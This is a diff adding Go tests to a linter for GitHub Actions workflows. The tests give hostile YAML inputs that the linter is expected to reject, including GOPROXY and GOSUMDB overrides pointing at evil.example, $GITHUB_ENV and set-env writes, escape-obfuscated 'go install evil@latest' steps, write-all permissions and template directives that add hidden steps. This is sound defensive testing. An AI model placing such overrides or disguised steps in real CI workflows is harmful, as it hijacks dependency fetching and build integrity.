@@ -321,3 +321,171 @@ func TestYAMLSubsetRefusesWhatALineScannerCouldMisread(t *testing.T) {
 		}
 	}
 }
+
+func TestTreeRulesReadCheckoutsAndPermissionsAsYAMLDoes(t *testing.T) {
+	t.Parallel()
+	for _, rejected := range []string{
+		// A name that spells the setting.
+		"steps:\n  - name: \"x, persist-credentials: false\"\n    uses: actions/checkout@SHA # v7.0.1\n",
+		// The setting in block-scalar text.
+		"steps:\n  - uses: actions/checkout@SHA # v7.0.1\n    with:\n      fetch-depth: 0\n  - run: |\n      persist-credentials: false\n",
+		// One flow line, two steps, one setting.
+		"steps: [{uses: actions/checkout@SHA, with: {persist-credentials: false}}, {uses: Actions/Checkout@SHA}]\n",
+		"steps:\n  - uses: actions/checkout@SHA # v7.0.1\n    with:\n      persist-credentials: \"true\"\n",
+		// A quoted `#` hiding a write scope.
+		"permissions: {a: '#', contents: write}\n",
+		"permissions: write-all\n",
+		"jobs:\n  a:\n    permissions:\n      checks: write\n",
+	} {
+		if text := snippet(rejected); len(treeViolations("t.yml", text, false)) == 0 {
+			t.Errorf("accepted: %s", text)
+		}
+	}
+	release := "permissions: {}\njobs:\n  a:\n    permissions:\n      contents: read\n      packages: write\n      id-token: write\n"
+	if violations := treeViolations("release.yml", release, true); len(violations) != 0 {
+		t.Errorf("rejected: %v", violations)
+	}
+	if len(treeViolations("ci.yml", release, false)) == 0 {
+		t.Error("a write scope outside the release workflow was accepted")
+	}
+}
+
+func TestGatedTemplatesUseOnlySimpleDirectives(t *testing.T) {
+	t.Parallel()
+	for _, rejected := range []string{
+		// A directive that renders a step the template text does not show.
+		"steps:\n{{\"      - \\x75ses: evil/act@main\"}}\n",
+		"steps:\n{{printf \"%s\" .Name}}\n",
+		"{{print .Name}}\n",
+		"{{template \"x\"}}\n",
+		"{{define \"x\"}}a{{end}}\n",
+		"{{with .DB}}{{.Image}}{{end}}\n",
+		"{{$x := .Name}}{{$x}}\n",
+		"{{if eq .Name \"x\"}}a{{end}}\n",
+		"{{index .DB.CIEnv 0}}\n",
+		"{{.Name | html}}\n",
+	} {
+		if len(templateDirectiveViolations("t.yml.tmpl", rejected)) == 0 {
+			t.Errorf("accepted: %q", rejected)
+		}
+	}
+	accepted := "{{- if and .DB .DB.Server}}\n  {{.DB.Service}}:\n{{- range .DB.CIEnv}}\n    {{index . 0}}: {{index . 1}}\n{{- end}}\n{{- else}}\n{{- end}}\n{{if not .DB}}x{{end}}\n"
+	if violations := templateDirectiveViolations("t.yml.tmpl", accepted); len(violations) != 0 {
+		t.Errorf("rejected: %v", violations)
+	}
+}
+
+// A reader that takes a key's first value and one that takes its last would
+// disagree, so no mapping repeats a key, in any case.
+func TestTreeRulesRefuseDuplicateKeysInAnyCase(t *testing.T) {
+	t.Parallel()
+	for _, rejected := range []string{
+		"steps:\n  - uses: actions/checkout@SHA # v7.0.1\n    with:\n      persist-credentials: false\n      Persist-Credentials: true\n",
+		"steps:\n  - uses: actions/checkout@SHA # v7.0.1\n    USES: evil/act@main\n",
+		"permissions:\n  contents: read\nPermissions:\n  contents: write\n",
+		"jobs:\n  a:\n    env: {A: x, a: y}\n",
+	} {
+		text := snippet(rejected)
+		if _, err := yamlDocuments(text, false); err == nil || !strings.Contains(err.Error(), "appears twice") {
+			t.Errorf("parsed: %s (%v)", text, err)
+		}
+		if len(treeViolations("t.yml", text, false)) == 0 {
+			t.Errorf("the tree rules accepted: %s", text)
+		}
+		if len(parserViolations("t.yml", text)) == 0 {
+			t.Errorf("the parser check accepted: %s", text)
+		}
+	}
+	// The same key in two different mappings is fine.
+	if _, err := yamlDocuments("jobs:\n  a:\n    env: {A: x}\n  b:\n    env: {A: y}\n", false); err != nil {
+		t.Error(err)
+	}
+}
+
+// Every redirecting variable is refused in an env: block at any level, in
+// any case, and in run text; GOTOOLCHAIN passes only pinned; a $GITHUB_ENV
+// write is refused whatever it sets.
+func TestEnvironmentRuleRejectsRedirectingVariables(t *testing.T) {
+	t.Parallel()
+	for _, rejected := range []string{
+		"env:\n  GOFLAGS: -mod=mod\n",
+		"jobs:\n  a:\n    env:\n      goproxy: https://evil.example\n",
+		"steps:\n  - run: go build ./...\n    env:\n      GONOSUMDB: '*'\n",
+		"env: {GONOSUMCHECK: \"1\"}\n",
+		"env:\n  GOSUMDB: \"off\"\n",
+		"env:\n  GOINSECURE: '*'\n",
+		"env:\n  GOPRIVATE: evil.example\n",
+		"env:\n  GONOPROXY: '*'\n",
+		"env:\n  GOENV: ./go.env\n",
+		"env:\n  GOTOOLCHAIN: auto\n",
+		"env:\n  GOTOOLCHAIN: go1.25.3+auto\n",
+		"env:\n  GOTOOLCHAIN: go1.25\n",
+		"steps:\n  - run: GOTOOLCHAIN=$V go test ./...\n",
+		"steps:\n  - run: go env -w GOPROXY=https://evil.example\n",
+		"steps:\n  - run: export GOFLAGS=-insecure\n",
+		"steps:\n  - run: echo \"GOPROXY=https://evil.example\" >> \"$GITHUB_ENV\"\n",
+		"steps:\n  - run: echo \"A=b\" >> $GITHUB_ENV\n",
+		"steps:\n  - run: |\n      printf '%s\\n' X=1 >> \"${github_env}\"\n",
+		// Round 6: the go env file moved through XDG_CONFIG_HOME or HOME,
+		// the toolchain, module cache and cache program, and the deprecated
+		// workflow commands with their switch.
+		"steps:\n  - run: XDG_CONFIG_HOME=\"$PWD/.ci\" go mod download\n",
+		"env:\n  XDG_CONFIG_HOME: ${{ github.workspace }}/.ci\n",
+		"env:\n  HOME: ${{ github.workspace }}\n",
+		"env: {\"HOME\": /tmp/ci}\n",
+		"steps:\n  - run: HOME=\"$PWD\" go mod download\n",
+		"steps:\n  - run: env HOME=/tmp/ci go build ./...\n",
+		"env:\n  GOCACHEPROG: /tmp/prog\n",
+		"env:\n  GOROOT: /tmp/go\n",
+		"env:\n  GOMODCACHE: /tmp/mods\n",
+		"env:\n  GOPATH: /tmp/gopath\n",
+		"env:\n  ACTIONS_ALLOW_UNSECURE_COMMANDS: \"true\"\n",
+		"steps:\n  - run: echo \"::set-env name=GOFLAGS::-mod=mod\"\n",
+		"steps:\n  - run: echo '::add-path::/tmp/bin'\n",
+	} {
+		if text := snippet(rejected); len(environmentViolations("t.yml", text)) == 0 {
+			t.Errorf("accepted: %s", text)
+		}
+	}
+	for _, accepted := range []string{
+		"env:\n  GOTOOLCHAIN: local\n  CGO_ENABLED: \"0\"\n",
+		"env:\n  GOTOOLCHAIN: go1.25.3\n",
+		"steps:\n  - run: GOTOOLCHAIN=local go test ./...\n",
+		"env:\n  FORGE_GOPROXYISH: x\n",
+		"steps:\n  - run: echo \"$HOME/bin\" >> \"$GITHUB_PATH\"\n",
+		"steps:\n  - run: ls \"${HOME}/.cache\" ~/.config\n",
+	} {
+		if violations := environmentViolations("t.yml", snippet(accepted)); len(violations) != 0 {
+			t.Errorf("rejected: %v", violations)
+		}
+	}
+}
+
+// A YAML escape in a double-quoted scalar spells text the rules never read
+// (`"g\x6f env -w"` is `go env -w`), so no double-quoted scalar, key or
+// value, holds a backslash.
+func TestYAMLSubsetRefusesEscapesInDoubleQuotedValues(t *testing.T) {
+	t.Parallel()
+	for _, rejected := range []string{
+		"steps:\n  - run: \"g\\x6f env -w GOPR\\x4fXY=https://evil.example\"\n",
+		"steps:\n  - run: \"echo GOFL\\x41GS=-mod=mod >> $GITHUB_\\x45NV\"\n",
+		"steps: [{run: \"g\\u006f install evil@latest\"}]\n",
+		"env:\n  A: \"\\\"quoted\\\"\"\n",
+		"\"u\\x73es\": evil/act@main\n",
+	} {
+		if len(yamlSubsetViolations("t.yml", rejected)) == 0 {
+			t.Errorf("accepted: %s", rejected)
+		}
+	}
+	for _, accepted := range []string{
+		// Plain and single-quoted scalars and block text have no escapes.
+		"steps:\n  - run: grep -r \"^v\\d\" .\n",
+		"steps:\n  - run: 'echo \\x61'\n",
+		"steps:\n  - run: |\n      printf \"a\\n\"\n",
+		"env:\n  A: \"no escape\"\n",
+	} {
+		if violations := yamlSubsetViolations("t.yml", accepted); len(violations) != 0 {
+			t.Errorf("rejected: %v", violations)
+		}
+	}
+}
